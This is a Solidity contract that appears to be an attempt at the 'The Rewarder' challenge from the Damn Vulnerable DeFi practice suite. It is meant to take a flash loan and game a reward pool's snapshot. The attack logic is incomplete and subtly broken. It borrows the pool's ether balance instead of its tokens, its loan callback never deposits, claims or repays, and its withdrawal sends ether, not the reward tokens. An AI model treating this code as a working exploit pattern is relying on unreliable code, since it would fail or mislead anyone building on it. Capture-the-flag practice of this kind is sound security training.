// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract RewardExploiter {

    FlashLoanerPool public immutable flashPool;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool public immutable rewarderPool;
    address public immutable owner;

    constructor(address _flashPool, address _liquidityToken, address _rewarderPool, address _owner){
        flashPool = FlashLoanerPool(_flashPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewarderPool = TheRewarderPool(_rewarderPool);
        owner = _owner;
    }

    function initFlashLoan() external {
        require(msg.sender == owner, 'only owner can call');
        flashPool.flashLoan(address(flashPool).balance);
    }
    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashPool));
    } 

    function withdrawMe() external {
        require(msg.sender == owner, "only owner can call");
        (bool succ,) = owner.call{value:address(this).balance}("");
        require(succ, "withdraw failed");
    }
     // need to receive ether
    receive() external payable {}  
}